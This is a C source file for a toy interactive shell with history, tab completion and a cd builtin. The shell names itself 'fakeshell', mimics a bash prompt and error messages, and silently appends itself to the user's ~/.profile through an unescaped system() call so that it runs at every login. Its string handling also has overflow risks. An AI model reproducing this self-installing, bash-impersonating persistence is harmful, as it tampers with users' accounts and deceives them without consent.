#include "shell_hdr.h"
Node *myLL=NULL;
char *all_exe[10000];
sigjmp_buf jumpbuf;
static int his_ctr=0;
static int hislinenum=1;

void LL_print(Node *myLL)
{
	Node *p=myLL;
	if(p!=NULL)
	{
		LL_print(p->next);
		printf("%d:  %s\n",hislinenum,p->cmd);
		hislinenum++;
	}
}

void LL_delete_last(void)
{
	Node *p=myLL;
	while(p->next->next!=NULL)
	{
		p=p->next;
	}
	free(p->next);
	p->next=NULL;
	hislinenum=1;//reset hislinenum
}

void LL_insert(char *cmd)
{
	his_ctr++;
	if(his_ctr>HISTSIZE)//history limit reaches
		LL_delete_last();
	Node *c=(Node *)malloc(sizeof(Node));
	strncpy(c->cmd,cmd,MAXLINE);
	c->next=myLL;
	myLL=c;
}

void LL_free(void)
{
	Node *p;
	while(myLL!=NULL)
	{
		p=myLL;
		myLL=myLL->next;
		free(p);
	}
	myLL=NULL;
}

void LL_to_file(FILE *fp,Node *myLL)
{
	Node *p=myLL;
	if(p!=NULL)
	{
		LL_to_file(fp,p->next);
		fputs(p->cmd,fp);
		fputs("\n",fp);
	}
}

char **cmd_completion(const char *cmd, int st, int ed)
{
	return rl_completion_matches(cmd,cmd_gen);
}

char *cmd_gen(const char *cmd,int state)
{
	static int i,len;
	char *name;
	if(!state)
	{
		i=0;
		len=strlen(cmd);
	}
	while(name=all_exe[i++])
	{
		if(!strncmp(name,cmd,len))
			return strdup(name);
	}
	return NULL;
}

//cannot use fatal() because it doesn't fork a child, will exit the shell instead
int nonfatal(char *message)
{
	perror(message);
	return 1;
}
int shell_cd(char **command)
{	
	if(command[1]==NULL || !strcmp(command[1],"~"))
	{
		if(chdir(getenv("HOME")))
			nonfatal("chdir");
	}
	else
	{
		if(!strcmp(command[1],".."))
		{
			if(chdir(command[1]))
				nonfatal("chdir");
		}
		else if(command[1][0]!='/')//if not absolute path
		{
			char *abs_path=NULL;
			char *home=getenv("HOME");
			int maxpath=strlen(command[1])+strlen(home)+2;
			abs_path=malloc(maxpath);
			if(!abs_path)
				nonfatal("malloc");
			snprintf(abs_path,maxpath,"%s/%s",home,command[1]);
			//these functions might have been changed in their implementations, using snprintf instead
			// strncpy(abs_path,home,strlen(home));
			// strcat(abs_path,"/");
			// strncat(abs_path,command[1],strlen(command[1]));
			if(chdir(abs_path))
				nonfatal("chdir");
			free(abs_path);
		}
		else
		{
			if(chdir(command[1]))
				nonfatal("chdir");
		}
	}
	return 1;
}

//exit the shell, not the child process
int shell_exit(char **command)
{
	return 0;
}
//handle the command, whether it is a binary executable or a shell builtin.
int execute(char **command)
{
	for(int i=0;i<NUMSHELLBUILTIN;i++)
	{
		if(!strcmp(command[0],shell_builtin[i]))
			return (*call_builtin_funcptr[i])(command);
	}	
	return launch_process(command);
}

int build_exe_list(int loc,char *dir)
{
	DIR *de;
	struct dirent *dp;
	de=opendir(dir);
	int i=loc;
	if(de==NULL)
		fatal("opendir");
	while(dp=readdir(de))
	{
		if(strcmp(dp->d_name,".")&&strcmp(dp->d_name,".."))
		{
			all_exe[i]=strdup(dp->d_name);
			i++;
		}
	}
	closedir(de);
	return i;
}

//handle control-c and control-z
void sig_handler(int dummy)
{
	write(1,"\n",1);
	siglongjmp(jumpbuf,1);
}

//print an error message then exit
void fatal(char *message)
{
	perror(message);
	exit(EXIT_FAILURE);
}

//fork and exec a launch_process
int launch_process(char **args)
{																			
	pid_t pid;
	int child_status;
	pid=fork();
	if(pid)
	{
		waitpid(pid,&child_status,WUNTRACED);
		while(!WIFEXITED(child_status)&&!WIFSIGNALED(child_status))
		{
			waitpid(pid,&child_status,WUNTRACED);
		}
	}
	else if(pid==-1)
		fatal("fork");
	else
	{
		if(execvp(args[0],args)==-1)
		{
			char error[140];
			strcpy(error,"bash: ");
			strncat(error,args[0],80);
			fatal(error);
		}
		
	}
	return 1;//means success
}

//parse user input into separate tokens, i.e array of strings
char **parse_args(char *command)
{
	ssize_t size=0; 
	int i=0,MAX_CHAR=80;
	char *token;
	char **tokens=malloc(MAX_CHAR*sizeof(char *));
	if(!tokens)
		fatal("malloc");
	token=strtok(command,DELIM);
	while(token!=NULL)
	{
		tokens[i]=token;
		i++;
		if(i>=MAX_CHAR)
		{
			MAX_CHAR+=MAX_CHAR;
			tokens=realloc(tokens,MAX_CHAR*sizeof(char *));
			if(!tokens)
				fatal("realloc");
		}
		token=strtok(NULL,DELIM);
	}
	tokens[i]='\0';//terminate line string
	return tokens;
}

//program mainloop
void mainloop(char *argv)
{
	int return_status,loc=0;
	char *line,hostname[MAXHOSTNAME];
	char **args;
	char *bin_locations[]={"/bin","/usr/bin","/usr/local/sbin","/sbin","/usr/sbin","/usr/local/sbin"};
	int numloc=sizeof(bin_locations)/sizeof(bin_locations[0]);//total number of ptr/ptr size
	for(int i=0;i<numloc;i++)
	{
		loc=build_exe_list(loc,bin_locations[i]);
	}
	char *user=getenv("USER");
	if(gethostname(hostname,MAXHOSTNAME))
		fatal("gethostname");

	if(access(HISTFILENAME,F_OK)!=-1)//file exist
	{
		FILE *fp=fopen(HISTFILENAME,"r");
		if(fp==NULL)
			fatal("fopen");
		char cmds[MAXLINE];
		while(fgets(cmds,MAXLINE,fp))//read from file line by line
		{
			strtok(cmds,"\n");//remove newline
			add_history(cmds);
			LL_insert(cmds);
		}
		fclose(fp);
	}
	char cwd[MAXCWD];
	getcwd(cwd,MAXCWD);

	//this code block checks to see if the fakeshell is already in .profile or not, if not then add it in, else do nothing
	//now everytime user execute bash, this shell will be executed first
	char profile[MAXLINE];
	snprintf(profile,MAXLINE,"%s/.profile",getenv("HOME"));
	FILE *tmpfp=fopen(profile,"r");
	if(tmpfp==NULL)
		fatal("fopen");
	char buf[100];
	int found=0;
	while(fgets(buf,100,tmpfp))
	{
		if(strstr(buf,"fshell")!=NULL)
			found=1;
	}
	if(found==0)
	{
		char nodotslash[7];
		memcpy(nodotslash,&argv[2],6);
		nodotslash[6]='\0';
		char appendcmd[MAXLINE];
		snprintf(appendcmd,MAXLINE,"echo '%s/%s' >> %s",cwd,nodotslash,profile);
		system(appendcmd);
	}
	fclose(tmpfp);

	struct sigaction sighandler;
	sighandler.sa_handler=sig_handler;
	sigaction(SIGINT,&sighandler,NULL);
	sigaction(SIGTSTP,&sighandler,NULL);
	do
	{
		getcwd(cwd,MAXCWD);
		char prompt[MAXPROMPT];
		snprintf(prompt,MAXPROMPT,"\033[0;31m%s@%s:\033[;34m%s#\033[0m ",user,hostname,cwd);
		rl_attempted_completion_function=cmd_completion;
		while(sigsetjmp(jumpbuf,1));
		line=readline(prompt);//holds the line
		if(strlen(line)==0)//if only newline is entered
		{
			return_status=1;
			continue;
		}
		args=parse_args(line);
		int i=0;
		char full_cmd[MAXLINE];
		while(args[i]!=NULL)
		{
			if(i==0)
				strcpy(full_cmd,args[i]);
			else
			{
				strcat(full_cmd," ");
				strcat(full_cmd,args[i]);
			}
			i++;
		}
		if(!strcmp(line,"history"))
		{
			LL_insert("history");
			LL_print(myLL);
			return_status=1;
			free(line);//prevent memory leak
			free(args);//prevent memory leak 
			continue;
		}

		if(!strcmp(line,"exit"))//if it is exit 
		{
			free(line);//prevent memory leak
			return_status=call_builtin_funcptr[0](args);//calling exit
			free(args);//prevent memory leak
			FILE *fp=fopen(HISTFILENAME,"w");
			if(fp==NULL)
				fatal("fopen");
			LL_to_file(fp,myLL);
			LL_free();
			fclose(fp);
			continue;
		}
		else
		{
			add_history(full_cmd); //Point of change here
			LL_insert(full_cmd);//add cmd to myLL (only command)
			return_status=execute(args);
			free(line);
			free(args);
		}

	}while(return_status);

}

int main(int argc, char *argv[])
{
	mainloop(argv[0]);
}
